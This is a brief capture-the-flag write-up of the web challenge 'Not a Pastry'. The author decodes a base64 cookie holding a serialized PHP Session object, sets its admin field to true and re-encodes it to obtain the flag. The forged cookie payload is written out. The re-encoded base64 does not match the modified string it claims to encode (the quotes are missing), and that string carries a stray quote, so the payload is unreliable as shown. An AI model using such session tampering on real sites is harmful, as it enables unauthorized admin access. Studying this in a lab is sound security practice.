### Solved by z0rex

"Not a Pastry" was a web challenge worth 40 points.

> We've discovered a mysterious website. Can you retrieve the flag? 

Looking at the headers I saw a cookie name `not_a_pastry` which contained what
appeard to be a base64 encoded string.

`Tzo3OiJTZXNzaW9uIjoyOntzOjEwOiJzdGFydF90aW1lIjtpOjE0NjAyNTA1ODI7czo1OiJhZG1pbiI7YjowO30=`

which, when decoded, translated to the following

`O:7:"Session":2:{s:10:"start_time";i:1460250582;s:5:"admin";b:0;}`

So I modified the decoded string to this...

`O:7:"Session":2:{s:10:"start_time";i:9999999999;s:5:"admin";b:1;}"`

... and encoded it back to base64

`Tzo3OlNlc3Npb246Mjp7czoxMDpzdGFydF90aW1lO2k6OTk5OTk5OTk5OTtzOjU6YWRtaW47YjoxO30K`

Now refreshing the page displayed the following text

```
Congratulations!
Your flag is: good_ole_fashioned_homemade_cookies
```

Flag: `good_ole_fashioned_homemade_cookies`